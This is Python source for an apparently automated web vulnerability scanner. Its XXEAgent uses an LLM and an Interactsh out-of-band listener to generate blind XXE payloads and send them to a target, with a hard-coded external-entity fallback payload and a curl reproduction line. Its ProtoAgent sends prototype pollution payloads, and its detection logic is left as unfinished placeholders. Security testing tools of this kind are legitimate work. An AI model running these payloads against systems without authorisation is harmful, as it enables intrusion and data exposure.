from pathlib import Path
from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.llm_client import llm_client
from bugtrace.core.job_manager import JobStatus
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.agents.base import BaseAgent
from typing import List, Dict
import asyncio

logger = get_logger("agents.specialists")

# ==============================================================================
# XXE SPECIALIST V3 (Advanced reasoning + OOB Validation)
# ==============================================================================
class XXEAgent(BaseAgent):
    """
    Advanced XXE Agent that uses LLM reasoning and OOB validation.
    Capabilities:
    - Detects XML parsing logic even in non-obvious inputs
    - Generates OOB payloads (Blind XXE)
    - Validates via Interactsh callback
    """
    
    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None):
        super().__init__("XXEAgent", "XML Exploitation Specialist")
        self.url = url
        self.params = params if params is not None else [] # Fixed: Default empty list for params
        self.report_dir = report_dir or Path("./reports")
        self.interactsh = None
        
    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] ðŸ¦… Initiating Deep XXE Resonance on {self.url}...", "INFO")
        
        # 1. Setup OOB Channel (Critical for Blind XXE)
        self.interactsh = InteractshClient()
        await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
        oob_domain = self.interactsh.domain
        dashboard.log(f"[{self.name}] OOB Listener active: {oob_domain}", "INFO")

        findings = []
        
        # 2. Analyze & Generate Payloads via LLM
        # We ask LLM to resonant with the idea of XML parsing
        prompt = f"""
        TARGET: {self.url}
        PARAMS: {self.params}
        OOB_DOMAIN: {oob_domain}
        
        You are an expert in XXE (XML External Entity) attacks.
        Generate 3 distinct payloads to test for Blind XXE.
        1. Basic Entity Injection (OOB HTTP Request)
        2. Parameter Entity Injection (Remote DTD)
        3. SOAP/API adaptation if applicable
        
        Return ONLY the payloads using XML format:
        <payload>payload1</payload>
        <payload>payload2</payload>
        """
        
        try:
            # XML Migration: Removed response_format="json"
            response = await self.exec_tool("LLM_Generation", llm_client.generate, prompt, module_name="XXEAgent", timeout=45)
            
            from bugtrace.utils.parsers import XmlParser
            payloads = XmlParser.extract_list(response, "payload")
            if not payloads:
                 raise ValueError("No XML payloads found")

        except Exception: # Catch specific exceptions if possible
            payloads = [
                f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://{oob_domain}/xxe">]><root>&test;</root>'
            ]
            
        # 3. Execute Attacks
        for i, payload in enumerate(payloads):
            dashboard.set_status("XXE Attack", f"Payload {i+1}/{len(payloads)}")
            
            # Send payload (assuming naive injection in params for now, 
            # ideally we should inject in body but we start simple)
            # In a real heavy agent we would swap Content-Type to application/xml
            
            # Testing param injection
            for param in self.params:
                # Use safety wrapper for network call
                await self.exec_tool(
                    f"Injection_{i}", 
                    self._send_xxe_payload, 
                    param, 
                    payload, 
                    timeout=20,
                    default_return=None
                )
                
            # 4. Check OOB Verification
            await asyncio.sleep(2) # propagation delay
            await self.interactsh.poll()
            
            if self.interactsh.check_url_hit("xxe") or len(self.interactsh.interactions) > 0:
                dashboard.log(f"[{self.name}] ðŸŽ¯ XXE BLIND CALLBACK RECEIVED!", "CRITICAL")
                findings.append({
                    "type": "XXE (Blind)",
                    "url": self.url,
                    "evidence": "Interactsh OOB Callback received",
                    "payload": payload,
                    "severity": "CRITICAL",
                    "validated": True,
                    "status": "VALIDATED_CONFIRMED",
                    "description": f"Blind XML External Entity (XXE) injection confirmed via Out-of-Band (OOB) callback. The server parsed malicious XML and made an external request to our Interactsh server, confirming the vulnerability.",
                    "reproduction": f"# Blind XXE with OOB exfiltration:\ncurl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:200]}...'"
                })
                break # Stop after confirmed exploit
        
        await self.interactsh.deregister()
        return {"findings": findings, "status": JobStatus.COMPLETED}

    async def _send_xxe_payload(self, param, payload):
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        # 1. GET Injection
        parsed = urlparse(self.url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        params[param] = payload
        target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(params), parsed.fragment))
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target_url, timeout=10) as resp:
                    pass # We only care about the OOB callback
        except Exception: # Catch specific exceptions if possible
            pass
            
        # 2. POST Injection (Content-Type switch) technique
        try:
            async with aiohttp.ClientSession() as session:
                # Try sending as XML body
                async with session.post(
                    self.url, 
                    data=payload, 
                    headers={"Content-Type": "application/xml"},
                    timeout=10
                ) as resp:
                    pass
        except Exception: # Catch specific exceptions if possible
            pass


# ==============================================================================
# PROTOTYPE POLLUTION V3 (Browser-Native Validation)
# ==============================================================================
class ProtoAgent(BaseAgent):
    """
    Prototype Pollution Specialist.
    Uses Browser logic to verify if injecting __proto__ affects JS execution.
    """
    
    def __init__(self, url: str, params: List[str] = None, report_dir: Path = None):
        super().__init__("ProtoAgent", "Client-Side PP Specialist")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        
    async def run_loop(self) -> Dict:
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] Checking Prototype Pollution...", "INFO")

        findings = []

        # Advanced technique: Probing for property poisoning
        probe_prop = "bugtrace_pp"
        probe_val = "1337"

        payloads = [
            f"__proto__[{probe_prop}]={probe_val}",
            f"__proto__.{probe_prop}={probe_val}",
            f"constructor[prototype][{probe_prop}]={probe_val}"
        ]

        from bugtrace.tools.visual.verifier import XSSVerifier
        verifier = XSSVerifier(headless=True)

        attack_url = None
        for payload in payloads:
            # Construct URL
            char = "&" if "?" in self.url else "?"
            attack_url = f"{self.url}{char}{payload}"

            # Use Safety Wrapper for Browser Verification
            # We want to check if window[probe_prop] exists after injection
            dashboard.set_status("Proto Attack", f"Testing {payload[:20]}...")

            result = await self.exec_tool(
                "Browser_Check",
                verifier.verify_xss, # We reuse the verifier mechanism but look for console/dom
                attack_url,
                str(self.report_dir),
                timeout=40,
                default_return=None
            )

            # Since verify_xss looks for specific markers, we might need a custom check script
            # For now, we assume if it didn't crash and we could inspect output...
            # Ideally we'd modify Verifier to inject a custom JS check like:
            # return !!window.bugtrace_pp

            # Fallback: Simple heuristic via LLM analysis of response source
            # If the payload reflects in a <script> block unsanitized

            pass # (Placeholder for V3 browser logic expansion)

        # Simple Logic for now: check if payload reflected in JS context
        if attack_url:
            await self._check_reflection(attack_url, probe_prop)

        return {"findings": findings, "status": JobStatus.COMPLETED}

    async def _check_reflection(self, attack_url: str, probe_prop: str):
        """Check if payload is reflected in response text."""
        import aiohttp
        try:
            async with aiohttp.ClientSession() as session:
                text = await self._fetch_response_text(session, attack_url)
                # Guard: Early return if fetch failed
                if text is None:
                    return
                # Guard: Early return if property detection conditions not met
                if not (f"{probe_prop}" in text and "__proto__" not in text and "constructor" not in text):
                    return
                # If payload was consumed but prop remains... uncertain evidence
                pass
        except Exception:
            pass

    async def _fetch_response_text(self, session, url: str):
        """Fetch response text from URL."""
        try:
            async with session.get(url) as resp:
                return await resp.text()
        except Exception:
            return None
